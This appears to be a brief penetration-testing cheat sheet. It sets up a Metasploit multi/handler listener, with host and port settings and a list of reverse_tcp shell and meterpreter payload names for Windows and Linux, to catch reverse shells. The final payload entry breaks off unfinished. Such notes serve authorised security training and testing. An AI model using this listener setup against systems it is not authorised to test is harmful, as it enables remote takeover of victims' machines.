# Reverse Shell

## Multi Handler

* Start the PostgreSQL service `service postgresql start`.
* Start the metasploit console `msfconsole`.
* `use exploit/multi/handler`.

## Setting Up a listener in multi handler

* `set lhost 192.168.1.10`.
* `set lport 4444`.
* Then we need to specify the payload,
  * netcat shell
    * windows listener payload windows/shell/reverse\_tcp
    * linux listener payload payload linux/x86/shell/reverse\_tcp
  * meterpreter shell
    * windows listener payload windows/meterpreter/reverse\_tcp
    * linux listener payload linux

